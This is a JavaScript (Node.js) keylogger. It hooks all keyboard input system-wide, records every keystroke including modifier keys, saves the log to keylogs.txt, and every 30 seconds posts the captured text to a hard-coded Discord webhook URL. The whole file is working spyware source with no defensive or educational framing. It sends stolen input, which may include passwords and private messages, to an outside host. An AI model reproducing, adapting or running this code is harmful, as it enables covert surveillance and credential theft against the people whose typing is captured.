const { GlobalKeyboardListener } = require("node-global-key-listener");
const axios = require("axios");
const fs = require("fs");
const path = require("path");

const webhookURL =
  "https://discord.com/api/webhooks/1238775133556965407/ieHvIchiUnQ8mHRcYec0TxVAf29cRdzSenJomWzWll1PouCjwmmb5AlUrpWmCKo37mC2";
const logFilePath = path.join(__dirname, "keylogs.txt");
const interval = 30;

const v = new GlobalKeyboardListener();
let keylogs = "";

v.addListener(function (e) {
  if (e.state == "UP") {
    switch (e.name) {
      case "TAB":
        process.stdout.write("<TAB>");
        keylogs += "<TAB>";
        break;
      case "RETURN":
        process.stdout.write("<ENTER>");
        keylogs += "<ENTER>";
        break;
      case "SPACE":
        process.stdout.write(" ");
        keylogs += " ";
        break;
      case "ESCAPE":
        process.stdout.write("<ESC>");
        keylogs += "<ESC>";
        break;
      case "DELETE":
        process.stdout.write("<DEL>");
        keylogs += "<DEL>";
        break;
      case "BACKSPACE":
        process.stdout.write("<B.SPACE>");
        keylogs += "<B.SPACE>";
        break;
      case "NUMPAD 1":
        process.stdout.write("<NUMPAD 1>");
        keylogs += "<NUMPAD 1>";
        break;
      case "NUMPAD 2":
        process.stdout.write("<NUMPAD 2>");
        keylogs += "<NUMPAD 2>";
        break;
      case "NUMPAD 3":
        process.stdout.write("<NUMPAD 3>");
        keylogs += "<NUMPAD 3>";
        break;
      case "NUMPAD 4":
        process.stdout.write("<NUMPAD 4>");
        keylogs += "<NUMPAD 4>";
        break;
      case "NUMPAD 5":
        process.stdout.write("<NUMPAD 5>");
        keylogs += "<NUMPAD 5>";
        break;
      case "NUMPAD 6":
        process.stdout.write("<NUMPAD 6>");
        keylogs += "<NUMPAD 6>";
        break;
      case "NUMPAD 7":
        process.stdout.write("<NUMPAD 7>");
        keylogs += "<NUMPAD 7>";
        break;
      case "NUMPAD 8":
        process.stdout.write("<NUMPAD 8>");
        keylogs += "<NUMPAD 8>";
        break;
      case "NUMPAD 9":
        process.stdout.write("<NUMPAD 9>");
        keylogs += "<NUMPAD 9>";
        break;
      case "LEFT SHIFT":
        process.stdout.write("</L.SHIFT>");
        keylogs += "</L.SHIFT>";
        break;
      case "LEFT ALT":
        process.stdout.write("</L.ALT>");
        keylogs += "</L.ALT>";
        break;
      case "RIGHT SHIFT":
        process.stdout.write("</R.SHIFT>");
        keylogs += "</R.SHIFT>";
        break;
      case "RIGHT ALT":
        process.stdout.write("</R.ALT>");
        keylogs += "</R.ALT>";
        break;
      case "LEFT CTRL":
        process.stdout.write("</L.CTRL>");
        keylogs += "</L.CTRL>";
        break;
      case "RIGHT CTRL":
        process.stdout.write("</R.CTRL>");
        keylogs += "</R.CTRL>";
        break;
      default:
        process.stdout.write(e.name);
        keylogs += e.name;
    }
  } else {
    switch (e.name) {
      case "LEFT SHIFT":
        process.stdout.write("<L.SHIFT>");
        keylogs += "<L.SHIFT>";
        break;
      case "LEFT ALT":
        process.stdout.write("<L.ALT>");
        keylogs += "<L.ALT>";
        break;
      case "RIGHT SHIFT":
        process.stdout.write("<R.SHIFT>");
        keylogs += "<R.SHIFT>";
        break;
      case "RIGHT ALT":
        process.stdout.write("<R.ALT>");
        keylogs += "<R.ALT>";
        break;
      case "LEFT CTRL":
        process.stdout.write("<L.CTRL>");
        keylogs += "</L.CTRL>";
        break;
      case "RIGHT CTRL":
        process.stdout.write("<R.CTRL>");
        keylogs += "</R.CTRL>";
        break;
    }
  }
});

setInterval(async () => {
  try {
    fs.appendFileSync(logFilePath, keylogs);
    await axios.post(webhookURL, { content: keylogs });
    keylogs = "";

    console.log("\nKeylogs sent successfully.");
  } catch (error) {
    console.error("Error sending keylogs:", error.message);
  }
}, interval * 1000);
